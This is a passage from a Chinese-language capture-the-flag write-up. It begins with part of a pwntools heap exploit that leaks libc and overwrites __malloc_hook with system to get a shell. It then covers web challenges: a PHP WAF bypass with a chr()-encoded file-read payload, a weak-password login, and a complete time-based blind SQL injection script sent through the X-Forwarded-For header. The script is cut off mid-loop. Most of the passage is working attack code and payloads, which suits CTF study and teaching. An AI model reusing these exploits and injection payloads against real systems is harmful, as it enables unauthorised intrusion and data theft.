        os.system('rm -f /tmp/gdb_symbols{}* /tmp/gdb_pid{}* /tmp/gdb_script{}*'.replace('{}', salt))
        exit(0)
    for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
        signal.signal(sig, clear)
    # # Create a symbol file for GDB debugging
    # try:
    #     gdb_symbols = '''
    #     '''
    #     f = open('/tmp/gdb_symbols{}.c'.replace('{}', salt), 'w')
    #     f.write(gdb_symbols)
    #     f.close()
    #     os.system('gcc -g -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
    #     # os.system('gcc -g -m32 -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
    # except Exception as e:
    #     print(e)
    context.arch = 'amd64'
    # context.arch = 'i386'
    # context.log_level = 'debug'
    execve_file = './checkin'
    # sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols{}.so'.replace('{}', salt)})
    sh = process(execve_file)
    # sh = remote('', 0)
    elf = ELF(execve_file)
    # libc = ELF('./libc-2.27.so')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    # Create temporary files for GDB debugging
    try:
        gdbscript = '''
        def pr
            x/40gx $rebase(0x203040)
            end
        # b *$rebase(0x1544)
        b realloc
        '''
        f = open('/tmp/gdb_pid{}'.replace('{}', salt), 'w')
        f.write(str(proc.pidof(sh)[0]))
        f.close()
        f = open('/tmp/gdb_script{}'.replace('{}', salt), 'w')
        f.write(gdbscript)
        f.close()
    except Exception as e:
        pass
    def pull(index, hex):
        sh.sendlineafter('choice:', '1')
        sh.sendlineafter(':n', str(index))
        sh.sendlineafter(':n', hex)
    def fire(index):
        sh.sendlineafter('choice:', '2')
        sh.sendlineafter(':n', str(index))
        sh.recvuntil(':n')
        return sh.recvuntil('Discard', drop=True)
    def bomb():
        sh.sendlineafter('choice:', '3')
        sh.recvuntil('0x')
        return sh.recvuntil('n', drop=True)
    pull(9, '01')
    pull(12, '01')
    pull(0, '11' * 0x58)
    pull(1, '22' * 0x58)
    fire(0)
    fire(1)
    result = fire(0)[-8:]
    heap_addr = u64(result, endian='big') - 0xb20
    log.success('heap_addr: ' + hex(heap_addr))
    fire(1)
    fire(0)
    fire(1)
    fire(0)
    pull(2, '11' * 0x410)
    result = fire(0)[-8:]
    libc_addr = u64(result, endian='big') - 0x3ebd00
    log.success('libc_addr: ' + hex(libc_addr))
    pause()
    chunk_addr = p64(libc_addr + libc.symbols['__malloc_hook'] + 0x10 - 0x33, endian='big')
    pull(0, binascii.b2a_hex(chunk_addr ))
    pull(3, '11' * 0x58)
    system = p64(libc_addr + libc.symbols['system'], endian='big')
    pull(6, binascii.b2a_hex('/bin/sh'[::-1]))
    payload = '00' * 8 + binascii.b2a_hex(system) + '11' * 0xb
    payload = payload.rjust(0x58 * 2, '1')
    pull(4,  payload)
    pull(6, '11' * 0x18 + binascii.b2a_hex('/bin/sh'[::-1]))
    sh.interactive()
    clear()
## web
###  easy_calc
这道题刚打开看到是一个计算器功能，一开始以为是ssti。并且发现有个calc.php
发现过滤了一些字符，和国赛的math题有点像，但是奇怪的是这里num输入字符无法解析。也就是说有waf让num参数只能是数字。怎么绕过去呢？
前几天读到一个php的一个字符串解析特性绕过bypass。
就是在num前面加个空格等一些字符就能绕过了。
剩下的就很简单了，利用chr()函数绕过特殊字符的限制来进行代码执行读flag。
    calc.php? num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))
###  easy_java
这道题个人感觉就是考了一些java web的一些基础知识。突破点就是弱口令，和一个脑洞filename。
这里的弱口令是admin/admin888,进入后可以看到一个图片images/img1.jpg
但是通过get怎么都无法dowload下这个图片，后来对友说这是个post。
这下就可以了。然后就去读文件了:
base64解密后就是flag
###  online_proxy
根据“可能会收集信息”的提示，在 `X-Forwarded-For` 处fuzz出来注入点。
然后就是注入的套路，二分法，时间盲注。然后就是在库里面找flag。。。找了很久才找到。
BTW，ssrf完全没用的。
附上完整注入脚本：
    import requests
    import string
    import random
    import time
    import sys
    url = 'http://*********************.4hou.com.cn:*****/'
    def rand_str(length=8):
        return ''.join(random.sample(string.ascii_letters + string.digits, length))
    def brute_schema(i, c):
        cookies = {"track_uuid": "ad6e17bd-1a8b-442e-f834-%s" % rand_str()}
        headers = {"X-Forwarded-For": "1' and if(binary(select substr(table_schema,%d,1) from information_schema.tables group by table_schema limit 4,1)>=char(%d),sleep(1),0))#" % (i, ord(c))}
        headers["X-Forwarded-For"] += rand_str()
        while True:
            try:
                requests.get(url, headers=headers, cookies=cookies, timeout=3)
            except:
                continue
            break
        headers["X-Forwarded-For"] = rand_str()
        t1 = 0
        t2 = 0
        while True:
            try:
                t1 = time.time()
                requests.get(url, headers=headers, cookies=cookies, timeout=3)
                t2 = time.time()
            except:
                continue
            break
        if t2 - t1 > 1: return True
        return False
    def brute_table(i, c):
        cookies = {"track_uuid": "ad6e17bd-1a8b-442e-f834-%s" % rand_str()}
        headers = {"X-Forwarded-For": "1' and if(binary(select substr(table_name,%d,1) from information_schema.tables where table_schema='F4l9_D4t4B45e' limit 0,1)>=char(%d),sleep(2),0))#" % (i, ord(c))}
        headers["X-Forwarded-For"] += rand_str()
        while True:
            try:
                requests.get(url, headers=headers, cookies=cookies, timeout=3)
            except:
                continue
            break
        headers["X-Forwarded-For"] = rand_str()
        t1 = 0
        t2 = 0
        while True:
            try:
                t1 = time.time()
                requests.get(url, headers=headers, cookies=cookies, timeout=3)
                t2 = time.time()
            except:
                continue
            break
        if t2 - t1 > 2: return True
        return False
    def brute_column(i, c):
        cookies = {"track_uuid": "ad6e17bd-1a8b-442e-f834-%s" % rand_str()}
        headers = {"X-Forwarded-For": "1' and if(binary(select substr(column_name,%d,1) from information_schema.columns where table_name='F4l9_t4b1e' limit 0,1)>=char(%d),sleep(2),0))#" % (i, ord(c))}
        headers["X-Forwarded-For"] += rand_str()
        while True:
            try:
                requests.get(url, headers=headers, cookies=cookies, timeout=3)
            except:
                continue
            break
        headers["X-Forwarded-For"] = rand_str()
        t1 = 0
        t2 = 0
        while True:
            try:
                t1 = time.time()
                requests.get(url, headers=headers, cookies=cookies, timeout=3)
                t2 = time.time()
            except:
                continue
            break
        if t2 - t1 > 2: return True
        return False
    def brute_flag(i, c):
        cookies = {"track_uuid": "ad6e17bd-1a8b-442e-f834-%s" % rand_str()}
        headers = {"X-Forwarded-For": "1' and if(binary(select substr(F4l9_c01umn,%d,1) from F4l9_D4t4B45e.F4l9_t4b1e limit 1,1)>=char(%d),sleep(1),0))#" % (i, ord(c))}
        headers["X-Forwarded-For"] += rand_str()
        while True:
            try:
                requests.get(url, headers=headers, cookies=cookies, timeout=3)
            except:
                continue
            break
        headers["X-Forwarded-For"] = rand_str()
        t1 = 0
        t2 = 0
        while True:
            try:
                t1 = time.time()
                requests.get(url, headers=headers, cookies=cookies, timeout=3)
                t2 = time.time()
            except:
                continue
            break
        if t2 - t1 > 1: return True
        return False
    '''
    schema = ''
    for i in range(999):
        l = 0
        m = 0
        r = 0xff
        while True:
            m = (l + r) / 2
            print l, m, r
            if brute_schema(i + 1, chr(m)):
                if m == l:
                    schema += chr(l)
                    break
                l = m
            else:
                if m == l:
                    schema += chr(l)
                    break
                r = m
        print schema
    '''
    '''
    table = ''
    for i in range(999):
        l = 0
        m = 0
        r = 0xff
        while True:
            m = (l + r) / 2
            print l, m, r
            if brute_table(i + 1, chr(m)):
                if m == l:
                    table += chr(l)
                    break
                l = m
            else:
                if m == l:
                    table += chr(l)
                    break
                r = m
        print table
    '''
    '''
    column = ''
    for i in range(999):
        l = 0
        m = 0
        r = 0xff